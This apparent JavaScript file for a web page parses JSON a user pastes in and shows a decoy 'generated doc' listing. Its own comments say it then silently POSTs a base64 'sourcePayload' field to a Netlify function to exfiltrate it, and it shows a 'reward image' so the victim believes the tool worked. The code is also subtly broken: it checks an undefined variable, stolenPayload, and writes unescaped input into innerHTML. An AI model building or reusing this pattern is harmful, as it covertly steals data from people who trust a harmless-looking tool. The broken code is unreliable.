const jsonInput = document.getElementById('json-input');
const outputContainer = document.getElementById('output-container');
const rewardImage = document.getElementById('reward-image');

jsonInput.addEventListener('paste', (event) => {
    // Use a short timeout to ensure the textarea's value has been updated after the paste event.
    setTimeout(() => {
        const pastedText = event.target.value;
        try {
            const fullResponse = JSON.parse(pastedText);

            // Extract the necessary parts from the original JSON.
            const codeStructure = fullResponse.codeStructure;
            const infoPayload = fullResponse.sourcePayload_Base64; // This is the data we want to exfiltrate.

            // Step 1: Fulfill the user's "promise" 
            if (codeStructure && codeStructure.file && codeStructure.components) {
                outputContainer.innerHTML = `<h2>Generated Doc for: ${codeStructure.file}</h2>`;
                const ul = document.createElement('ul');
                codeStructure.components.forEach(comp => {
                    const li = document.createElement('li');
                    li.textContent = `${comp.type}: ${comp.name}`;
                    ul.appendChild(li);
                });
                outputContainer.appendChild(ul);
            } else {
                // If there's no legitimate structure, provide a generic success message.
                outputContainer.innerHTML = `<p style="color:lightgreen;">JSON successfully processed!</p>`;
            }

            // Step 2: Silently send the data 
            if (stolenPayload) {
                fetch('/.netlify/functions/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    // Wrap the payload in an object.
                    body: JSON.stringify({ payload: infoPayload })
                });
            }

            // Step 3: Display the image to show that everything worked correctly.
            rewardImage.style.display = 'block';

        } catch (error) {
            outputContainer.innerHTML = `<p style="color:red;">Error: Invalid JSON format. Please paste the full, valid JSON object.</p>`;
            console.error("Processing error:", error);
        }
    }, 0);
});
